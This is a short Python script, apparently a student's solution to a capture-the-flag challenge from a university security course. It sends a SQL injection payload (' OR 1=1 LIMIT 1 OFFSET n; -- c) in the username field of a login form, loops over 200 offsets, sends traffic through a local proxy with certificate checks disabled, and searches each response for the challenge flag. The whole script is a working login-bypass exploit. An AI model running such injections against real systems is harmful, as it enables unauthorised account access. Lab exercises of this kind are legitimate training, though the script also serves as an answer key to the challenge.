import requests
import re

proxies = {
  'https': 'http://127.0.0.1:8080',
}


queue = [""]
explored = set()
#simple BFS

for i in range(200):
        headers = {
  "Host": "q2.midterm.quoccacorp.com",
  "Cache-Control": "max-age=0",
  "Sec-Ch-Ua": "\"Chromium\";v=\"133\", \"Not(A:Brand\";v=\"99\"",
  "Sec-Ch-Ua-Mobile": "?0",
  "Sec-Ch-Ua-Platform": "\"Linux\"",
  "Accept-Language": "en-US,en;q=0.9",
  "Origin": "https://q2.midterm.quoccacorp.com",
  "Content-Type": "application/x-www-form-urlencoded",
  "Upgrade-Insecure-Requests": "1",
  "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "Sec-Fetch-Site": "same-origin",
  "Sec-Fetch-Mode": "navigate",
  "Sec-Fetch-User": "?1",
  "Sec-Fetch-Dest": "document",
  "Referer": "https://q2.midterm.quoccacorp.com/login",
  "Accept-Encoding": "gzip, deflate, br",
  "Priority": "u=0, i"
}

        data = {
    "username": f"' OR 1=1 LIMIT 1 OFFSET {i}; -- c",
    "password": ""
}
        print(data)
        r = requests.post("https://q2.midterm.quoccacorp.com/login", headers=headers,data=data,proxies=proxies, verify=False)
        flag = re.search(r"COMP6443\{.*?\}",r.text)
        if flag:
          print(flag.group(0))
          break
  

